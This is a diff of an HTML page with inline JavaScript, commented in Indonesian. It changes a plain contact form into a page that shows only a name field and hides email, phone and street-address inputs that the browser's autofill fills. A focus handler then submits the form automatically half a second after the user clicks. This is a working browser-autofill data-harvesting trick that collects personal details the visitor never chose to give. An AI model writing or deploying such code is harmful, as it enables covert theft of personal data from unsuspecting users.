@@ -3,35 +3,45 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Autofill Form</title>
+  <title>Autofill Form Magic</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h2>Autofill Form</h2>
-    <form id="autofillForm">
-      <input type="text" name="name" placeholder="Nama" autocomplete="name" required />
-      <input type="tel" name="phone" placeholder="Nomor HP" autocomplete="tel" required />
-      <input type="email" name="email" placeholder="Email" autocomplete="email" required />
-      <input type="text" name="address" placeholder="Alamat" autocomplete="street-address" />
-      <button type="submit">Kirim</button>
+    <h2>Isi 1 kolom saja</h2>
+    <form id="autofillForm" autocomplete="on">
+      <!-- Kolom utama yang terlihat -->
+      <input
+        type="text"
+        name="name"
+        placeholder="Klik sini (Nama)"
+        autocomplete="name"
+        required
+      />
+
+      <!-- Kolom tersembunyi lainnya untuk autofill -->
+      <input type="email" name="email" autocomplete="email" hidden />
+      <input type="tel" name="phone" autocomplete="tel" hidden />
+      <input type="text" name="address" autocomplete="street-address" hidden />
+
+      <p id="status"></p>
     </form>
-    <p id="status"></p>
   </div>
 
   <script>
     const form = document.getElementById("autofillForm");
     const status = document.getElementById("status");
 
+    // Saat kolom diklik dan autofill aktif, tunggu sebentar lalu kirim otomatis
     form.addEventListener("focusin", () => {
       setTimeout(() => {
         form.requestSubmit();
-      }, 200); // memberi waktu autofill muncul dulu
+      }, 500); // waktu tunggu autofill aktif
     }, { once: true });
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      status.textContent = "Mengirim...";
+      status.textContent = "Mengirim data...";
 
       const formData = new FormData(form);
       const data = Object.fromEntries(formData.entries());
@@ -49,7 +59,7 @@
           status.textContent = "Gagal mengirim ❌";
         }
       } catch (err) {
-        status.textContent = "Terjadi error ❌";
+        status.textContent = "Error koneksi ❌";
       }
     });
   </script>
